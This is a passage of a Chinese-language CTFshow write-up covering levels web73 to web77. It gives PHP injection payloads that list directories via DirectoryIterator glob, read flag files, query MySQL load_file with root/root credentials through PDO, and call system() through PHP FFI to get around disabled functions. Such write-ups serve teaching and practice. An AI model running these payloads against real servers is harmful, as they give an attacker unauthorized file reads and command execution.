class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

## web73

### payload

先查看再读取就行，本题禁用没有上一道严

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=var_export(scandir(&#x27;/&#x27;));exit(0);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=include(&#x27;/flagc.txt&#x27;);exit(0);</span><br></pre></td></tr></table></figure>

## web74

### payload

本题限制了scandir函数，使用72的方法代替查找，

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=?&gt;&lt;?php $a=new DirectoryIterator(&quot;glob:///*&quot;); foreach($a as $f) &#123;echo($f-&gt;__toString().&#x27; &#x27;);&#125; exit(0); ?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=include(&quot;/flagx.txt&quot;);exit();</span><br></pre></td></tr></table></figure>

## web75

### payload

本题都读取位置的方式跟上面相似

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=?&gt;&lt;?php $a=new DirectoryIterator(&quot;glob:///*&quot;); foreach($a as $f) &#123;echo($f-&gt;__toString().&#x27; &#x27;);&#125; exit(0); ?&gt;</span><br></pre></td></tr></table></figure>

但是本题对于php PDO连接数据库的利用，但又有一个坑点就是对于数据库名的获取存在问题，好像绕过仅依赖于本题，没有一个合适的获取方法，必须得根据前面题目所获取的容器找到相关配置信息，所以不细说

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=try &#123;$dbh = new PDO(&#x27;mysql:host=localhost;dbname=ctftraining&#x27;, &#x27;root&#x27;,&#x27;root&#x27;);foreach($dbh-&gt;query(&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;) as $row)&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh = null;&#125;catch (PDOException $e) &#123;echo $e-&gt;getMessage();exit(0);&#125;exit(0);</span><br></pre></td></tr></table></figure>

## web76

### payload

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=?&gt;&lt;?php $a=new DirectoryIterator(&quot;glob:///*&quot;); foreach($a as $f) &#123;echo($f-&gt;__toString().&#x27; &#x27;);&#125; exit(0); ?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=try &#123;$dbh = new PDO(&#x27;mysql:host=localhost;dbname=ctftraining&#x27;, &#x27;root&#x27;,&#x27;root&#x27;);foreach($dbh-&gt;query(&#x27;select load_file(&quot;/flag36d.txt&quot;)&#x27;) as $row)&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh = null;&#125;catch (PDOException $e) &#123;echo $e-&gt;getMessage();exit(0);&#125;exit(0);</span><br></pre></td></tr></table></figure>

同75

## web77

### payload

本题算是命令执行最后一题了

刚开始还是使用伪协议进行一个读取，得到如下内容

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bin boot dev etc flag36x.txt home lib lib64 media mnt opt proc readflag root run sbin srv sys tmp usr var</span><br></pre></td></tr></table></figure>

存在一个flag36x.txt和readflag

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=$ffi = FFI::cdef(&quot;int system(const char *command);&quot;);$a=&#x27;/readflag &gt; 1.txt&#x27;;$ffi-&gt;system($a);</span><br></pre></td></tr></table></figure>

最终需要的FFI调用绕过system函数的手段

FFI是PHP中调用C代码的手段

然后由于无回显将readflag内容写入1.txt，再读取1.txt得到flag
</p>
]]></content>
      <categories>
        <category>CTFshow</category>
      </categories>
      <tags>
        <tag>命令执行</tag>
      </tags>
  </entry>
</search>
